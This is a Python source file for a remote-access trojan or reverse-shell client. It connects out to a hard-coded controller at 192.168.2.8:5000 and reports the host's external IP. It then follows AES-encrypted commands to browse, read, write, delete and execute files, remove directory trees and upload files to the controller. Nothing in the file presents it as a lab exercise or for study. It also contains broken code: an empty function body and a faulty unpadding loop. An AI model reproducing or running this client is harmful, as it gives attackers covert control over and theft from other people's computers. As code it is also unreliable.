import socket
import requests
import os
from Crypto.Cipher import AES
import shutil
import os

#secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
Initialization_vector = b'This is a testIV'#IV must be 16 bytes long

def unpadding(message):
    while message.endswith(" "):
        message = message[:-1]
        return message

def padding(message):
        while(len(message.encode())%16!=0):
            message = message +" "
        return  message.encode()
    
def encryption(messageToEncrypt):
    obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
    return obj.encrypt(messageToEncrypt)

def decryption(ciphertext):
    obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
    return obj2.decrypt(ciphertext).decode()

def getCurrentWorkingDirectory():
    try:
        sending_message = os.getcwd()
    except Exception as e:
        sending_message="Exception: " + str(e)
    finally:
        return sending_message   

def changeDirectory(received_message):
    try:
        os.chdir(received_message[3:])
        sending_message = os.getcwd()
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return sending_message    
        
def listOfFilesAndFolders():
    try:     
        sending_message = os.listdir(os.getcwd())
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return str(sending_message)

def deleteFile(received_message):
     try:
        os.remove(received_message[7:])
        sending_message = 'File deleted'
     except Exception as e:
        sending_message="Exception: " + str(e) 
     finally:
        return sending_message

def createFile(receiving_message):
    try:
        file = os.open(receiving_message[7:],os.O_CREAT)
        os.close(file)
        sending_message = 'File created.'
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return sending_message

def executeFile(receiving_message):
    try:
        os.startfile(receiving_message[8:])
        sending_message="Executed "
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return sending_message       

def readFile(con,receiving_message):
    filename = receiving_message[5:]    
    if(os.path.exists(filename)):  
        try:
            file = os.open(filename,os.O_RDWR)
            print(receiving_message)
            sending_message = os.read(file,os.stat(file).st_size).decode()
        
        except Exception as e:
            sending_message="Exception: " + str(e) 
        finally:
            os.close(file)
            return sending_message
    else:
        return "File not found!"        

def writeToFile(con,received_message):
    filename = received_message[6:]
    #Build a text message until close is send
    try:
        file_len = int(decryption(con.recv(1024)))
        text = ""
        
        while file_len > len(text):
            text += decryption(con.recv(1024))
    #Open the file write the message and close() at the end
        else:
            text = unpadding(text)
            file=open(filename, "a+")
            file.write(text+ "\n")
            sending_message = "Message written successfully."
            
    
    except Exception as e:
        sending_message = str(e)
    finally:
        file.close()    
        return sending_message

def makeDirectories(receiving_message):
    try:
        os.makedirs(receiving_message[8:])
        sending_message = "Directory created."
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return sending_message

def removeDirectories(receiving_message):
    try:
        shutil.rmtree(receiving_message[10:])
        sending_message = 'Directory  deleted.'
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        return sending_message
    
#  we need a way to encryp files
def sendFile(con,received_message):
    try:
        filename = received_message[9:] 
        if(os.path.exists(filename)):
        
            #sending the filesize
            total = os.path.getsize(filename)
            padded_message = padding(str(total))
            sending_message = encryption(padded_message)
            con.sendall(sending_message)
    
            f = open(filename,'rb')
            l = f.read(4096)
            while (l):
                con.send(l)
                print('Sent ',repr(l))
                l = f.read(4096)
            sending_message = "Done"
        else:
            sending_message = filename + " does not exist."
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        try:
            f.close()
        except:
            pass
        return sending_message

def getFile(con,received_message):



def getIp():
    try:
        url = 'http://www.myexternalip.com/raw'
        r = requests.get(url)
        sending_message=("Connecting from: %s" %(r.text))
    except Exception as e:
        sending_message = "Failed to get the ip. with error: " + str(e)
    return  sending_message
    

def client():

    #Creating the socket passing the ip and port as parameters and trying to connect
    host = "192.168.2.8"
    port = 5000
    con = socket.socket()
    con.connect((host,port))
    received_message=""
    #Sending the first message with the ip of the client
    #makes the message a mulpiplier of 16 then encrypts it and sends it.
    con.send(encryption(padding(getIp())))

    
    while received_message != 'close_this_socket':
        # get the length of the incoming data
        len_data = int(decryption(con.recv(1024)));
        
        #start getting that data
        received_message = decryption(con.recv(1024))
        while len(received_message)<len_data:
            received_message += decryption(con.recv(1024))
        while received_message.endswith(" "):
                received_message = received_message[:-1]
        print(received_message)
        if received_message == "pwd":
           sending_message = getCurrentWorkingDirectory()
        elif received_message[0:2] == "cd":
           sending_message = changeDirectory(received_message)
        elif received_message == "dir":
           sending_message = listOfFilesAndFolders()
        elif received_message[0:9] == "removedir": 
           sending_message = removeDirectories(received_message)
        elif received_message[0:6] == "remove":
           sending_message = deleteFile(received_message)
        elif received_message[0:6] == "create":
           sending_message = createFile(received_message)
        elif received_message[0:7] == "execute":
           sending_message = executeFile(received_message)
        elif received_message[0:4] == "read":
           sending_message = readFile(con,received_message)
        elif received_message[0:5] == "write":
           sending_message = writeToFile(con,received_message)
        elif received_message[0:7] == "makedir":
           sending_message = makeDirectories(received_message)
        elif(received_message[0:8]=="download"):
           sending_message = sendFile(con,received_message)
        elif(received_message=="ip"):
           sending_message = getIp()
        else:
           sending_message = "use help"     
        
        
        #client send back data
        padded_message = padding(sending_message)
        print(" this is message len" ,len(padded_message))
        sending_message = encryption(padded_message)
        con.send(encryption(padding(str(len(sending_message)))))
        con.sendall(sending_message)

    con.close()    
        
if __name__ == "__main__":
    client()
        
